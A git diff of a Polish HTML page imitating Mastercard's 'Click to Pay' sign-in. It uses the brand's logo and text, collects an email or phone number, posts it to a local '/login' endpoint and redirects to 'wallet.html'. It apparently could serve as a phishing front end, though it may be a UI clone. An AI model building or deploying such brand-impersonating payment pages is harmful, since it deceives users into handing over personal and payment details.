@@ -1,195 +1,165 @@
 <!DOCTYPE html>
 <html lang="pl">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Click to Pay</title>
-    <link rel="icon" href="https://img.icons8.com/ios-filled/50/ffffff/mastercard-logo.png" />
-    <style>
-      :root {
-        --orange: #ff5a00;
-        --gray: #d9d9d9;
-        --dark: #1c1c1e;
-        --text-light: #fff;
-        --text-muted: #aaa;
-        --border: #3a3a3c;
-        --error: #ff453a;
-      }
-
-      * {
-        box-sizing: border-box;
-      }
-
-      body {
-        margin: 0;
-        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-        background-color: var(--dark);
-        color: var(--text-light);
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
-      }
-
-      .container {
-        width: 100%;
-        max-width: 400px;
-        padding: 2rem;
-      }
-
-      .top-bar {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        font-size: 0.9rem;
-        color: var(--text-light);
-      }
-
-      .top-bar .logos {
-        display: flex;
-        align-items: center;
-        gap: 6px;
-      }
-
-      .top-bar img {
-        width: 20px;
-        height: 20px;
-      }
-
-      .top-bar .globe {
-        cursor: pointer;
-      }
-
-      h1 {
-        font-size: 1.2rem;
-        color: var(--orange);
-        margin: 1.5rem 0 0.3rem;
-      }
-
-      h2 {
-        font-size: 1.2rem;
-        font-weight: normal;
-        margin-bottom: 1.2rem;
-        color: white;
-      }
-
-      .subtext {
-        font-size: 0.9rem;
-        color: var(--text-muted);
-        margin-bottom: 2rem;
-      }
-
-      .input-group {
-        position: relative;
-        margin-bottom: 2.5rem;
-      }
-
-      input {
-        background: none;
-        border: 1px solid var(--border);
-        border-radius: 6px;
-        width: 100%;
-        padding: 1.2rem 1rem 0.5rem;
-        color: white;
-        font-size: 1rem;
-      }
-
-      label {
-        position: absolute;
-        top: 1rem;
-        left: 1rem;
-        font-size: 1rem;
-        color: var(--text-muted);
-        pointer-events: none;
-        transition: 0.2s ease;
-      }
-
-      input:focus + label,
-      input:not(:placeholder-shown) + label {
-        top: 0.4rem;
-        font-size: 0.7rem;
-        color: var(--orange);
-      }
-
-      .error-text {
-        font-size: 0.75rem;
-        color: var(--error);
-        margin-top: 0.3rem;
-      }
-
-      .info-text {
-        font-size: 0.75rem;
-        color: var(--text-muted);
-        margin-top: -1.8rem;
-        margin-bottom: 1.5rem;
-      }
-
-      button {
-        width: 100%;
-        background-color: var(--gray);
-        color: black;
-        border: none;
-        padding: 0.9rem;
-        font-weight: bold;
-        border-radius: 999px;
-        cursor: pointer;
-        transition: background-color 0.2s;
-      }
-
-      button.active {
-        background-color: var(--orange);
-        color: white;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="container">
-      <div class="top-bar">
-        <div class="logos">
-          <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" />
-          <img src="https://img.icons8.com/ios-filled/50/ffffff/forward-button.png" />
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Click to Pay</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    input:focus ~ label,
+    input:not(:placeholder-shown) ~ label {
+      transform: scale(0.85) translateY(-1.5rem);
+      color: #e14d2a;
+    }
+    input:focus {
+      border-color: #e14d2a;
+    }
+    .error input {
+      border-color: #dc2626;
+    }
+    .error-icon {
+      position: absolute;
+      right: 1rem;
+      top: 50%;
+      transform: translateY(-50%);
+      background: #dc2626;
+      color: white;
+      border-radius: 9999px;
+      width: 1.25rem;
+      height: 1.25rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.75rem;
+    }
+  </style>
+</head>
+<body class="bg-[#1a1a1a] text-white font-sans">
+  <div class="max-w-md mx-auto mt-6 p-4">
+    <!-- Header -->
+    <div class="flex justify-between items-center mb-6">
+      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-10 h-10" />
+      <div class="relative group">
+        <button id="langBtn" class="flex items-center space-x-2">
+          <img src="https://img.icons8.com/ios-filled/24/999999/globe.png" class="w-5 h-5" />
+          <span class="text-white text-sm">PL</span>
+        </button>
+        <div id="langMenu" class="hidden absolute right-0 mt-2 bg-white text-black text-sm rounded shadow w-40 z-10">
+          <button class="block w-full text-left px-4 py-2 hover:bg-gray-100">Polska</button>
         </div>
-        <div class="globe">PL 🌐</div>
       </div>
-
-      <h1>Click to Pay</h1>
-      <h2>Szybki, bezpieczny sposób płatności online</h2>
-
-      <div class="input-group">
-        <input type="text" id="email" placeholder=" " />
-        <label for="email">Adres e-mail lub numer telefonu komórkowego</label>
-        <div class="error-text" id="error"></div>
-      </div>
-
-      <div class="info-text" id="info">Click to Pay użyje tych informacji, aby Cię zweryfikować i wysyłać na ten numer kody weryfikacyjne. Mogą zostać naliczone opłaty za wiadomości/transmisję danych.</div>
-
-      <button id="confirm">POTWIERDŹ</button>
     </div>
 
-    <script>
-      const input = document.getElementById('email');
-      const error = document.getElementById('error');
-      const button = document.getElementById('confirm');
+    <!-- Title -->
+    <div class="mb-4">
+      <h1 class="text-[#e14d2a] text-lg font-semibold leading-tight">Click to Pay</h1>
+      <p class="text-white text-lg">Szybki, bezpieczny sposób płatności online</p>
+    </div>
 
-      function validate(value) {
-        const phone = /^\+48\d{9}$/;
-        const email = /^[\w.-]+@[\w.-]+\.\w{2,}$/;
-        return phone.test(value) || email.test(value);
+    <!-- Subtitle -->
+    <p class="text-sm mb-6">Utwórz profil lub zaloguj się</p>
+
+    <!-- Form -->
+    <form id="loginForm" novalidate>
+      <div class="relative mb-1">
+        <input
+          id="userInput"
+          name="userInput"
+          type="text"
+          placeholder=" "
+          class="peer w-full bg-transparent border border-white rounded px-4 py-3 focus:outline-none"
+          required
+          pattern="(^\+48\d{9}$)|(^[\w.-]+@[\w.-]+\.\w{2,}$)"
+        />
+        <label for="userInput" class="absolute left-4 top-3 text-gray-400 text-sm transition-all peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-500 pointer-events-none">Adres e-mail lub numer telefonu komórkowego</label>
+        <div class="hidden error-icon">!</div>
+      </div>
+      <p id="helperText" class="text-xs text-white opacity-70 mb-4">Click to Pay użyje tych informacji, aby Cię zweryfikować i wysyłać na ten numer kody weryfikacyjne. Mogą zostać naliczone opłaty za wiadomości/transmisję danych.</p>
+
+      <button
+        type="submit"
+        class="w-full bg-gray-600 hover:bg-[#e14d2a] text-white font-semibold py-3 rounded transition-colors"
+      >
+        KONTYNUUJ
+      </button>
+    </form>
+
+    <!-- Footer -->
+    <div class="mt-12 text-xs text-center space-x-2 text-white">
+      <span>WARUNKI</span>
+      <span>&middot;</span>
+      <span>PRYWATNOŚĆ</span>
+      <span>&middot;</span>
+      <span>PLIKI COOKIE</span>
+      <span>&middot;</span>
+      <span>OPINIA</span>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const input = document.getElementById('userInput');
+    const helperText = document.getElementById('helperText');
+    const langBtn = document.getElementById('langBtn');
+    const langMenu = document.getElementById('langMenu');
+
+    langBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      langMenu.classList.toggle('hidden');
+    });
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const value = input.value.trim();
+      const emailRegex = /^[\w.-]+@[\w.-]+\.\w{2,}$/;
+      const phoneRegex = /^\+48\d{9}$/;
+
+      if (!value) {
+        showError('To pole jest wymagane');
+        return;
       }
 
-      input.addEventListener('input', () => {
-        if (!input.value.trim()) {
-          error.textContent = 'To pole jest wymagane';
-          button.classList.remove('active');
-        } else if (!validate(input.value)) {
-          error.textContent = 'Potwierdź adres e-mail i spróbuj ponownie';
-          button.classList.remove('active');
+      if (!emailRegex.test(value) && !phoneRegex.test(value)) {
+        showError('Potwierdź adres e-mail i spróbuj ponownie');
+        return;
+      }
+
+      clearError();
+
+      try {
+        const res = await fetch('/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user: value })
+        });
+
+        if (res.ok) {
+          window.location.href = 'wallet.html';
         } else {
-          error.textContent = '';
-          button.classList.add('active');
+          showError('Błąd logowania');
         }
-      });
-    </script>
-  </body>
+      } catch (err) {
+        showError('Błąd połączenia');
+      }
+    });
+
+    function showError(msg) {
+      input.parentElement.classList.add('error');
+      input.nextElementSibling.classList.remove('text-gray-400');
+      input.nextElementSibling.classList.add('text-red-500');
+      input.parentElement.querySelector('.error-icon').classList.remove('hidden');
+      helperText.textContent = msg;
+      helperText.classList.add('text-red-500');
+    }
+
+    function clearError() {
+      input.parentElement.classList.remove('error');
+      input.nextElementSibling.classList.remove('text-red-500');
+      input.nextElementSibling.classList.add('text-gray-400');
+      input.parentElement.querySelector('.error-icon').classList.add('hidden');
+      helperText.textContent = 'Click to Pay użyje tych informacji, aby Cię zweryfikować i wysyłać na ten numer kody weryfikacyjne. Mogą zostać naliczone opłaty za wiadomości/transmisję danych.';
+      helperText.classList.remove('text-red-500');
+    }
+  </script>
+</body>
 </html>
